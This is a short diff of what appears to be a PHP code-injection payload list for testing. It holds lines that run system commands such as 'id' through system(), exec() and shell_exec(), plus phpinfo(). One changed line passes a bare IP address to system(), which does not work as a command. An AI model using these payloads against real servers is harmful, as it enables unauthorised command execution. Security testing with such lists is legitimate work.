@@ -1,5 +1,5 @@
 phpinfo();
-system("id")
+system("94.142.213.178")
 ;system("id")
 exec("id")
 shell_exec("id")
